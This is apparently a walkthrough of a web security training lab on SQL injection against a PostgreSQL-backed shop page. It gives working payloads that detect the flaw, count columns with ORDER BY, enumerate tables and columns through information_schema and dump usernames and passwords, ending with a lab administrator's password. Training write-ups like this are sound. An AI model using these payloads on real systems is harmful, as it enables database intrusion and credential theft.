# SQL injection attack, listing the database contents on non-Oracle databases

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 0.png>)


## Solution

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 1.png>)

When I accessed the website, I tested the `Corporate gifts` category and found untrusted data in the URL.

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 2.png>)

I intercepted the request in Burp Suite and added a single quote to see what would happen:

```txt
Corporate gifts'
```

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 3.png>)

As expected, the server returned an error.

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 4.png>)

Like the previous labs, I used `ORDER BY` to determine the number of columns.  
I also used a binary search mindset to reduce the number of guesses.

Payload format:

```sql
a' ORDER BY <number_of_column> -- -
```

After testing, I determined that the query has 2 columns.

Based on the lab title, I knew the backend database was not Oracle.  
After some testing, I identified it as PostgreSQL because the `database()` function did not work.

Next, I enumerated the tables in the current database using the following payload:

```sql
a' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
```

After sending the payload through Burp Suite, I received the following result:

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 5.png>)

Among the tables, `users_nbyrri` looked the most interesting.

I then enumerated the columns in the `users_nbyrri` table using:

```sql
a' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_nbyrri' -- -
```

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 6.png>)

From the result, I found two valuable columns:

```txt
username_mnzale
password_bqukxq
```

At this point, I had all the required information:

```txt
Table name : users_nbyrri
Column 1   : username_mnzale
Column 2   : password_bqukxq
```

Finally, I used the following payload to retrieve the credentials:

```sql
a' UNION SELECT username_mnzale, password_bqukxq FROM users_nbyrri -- -
```

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 7.png>)

I successfully retrieved the administrator credentials:

```txt
username : administrator
password : a9z3dz5seq0wi5y1zpka
```

I logged into the administrator account and solved the lab.

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 8.png>)

![](<Images/SQL injection attack, listing the database contents on non-Oracle databases 9.png>)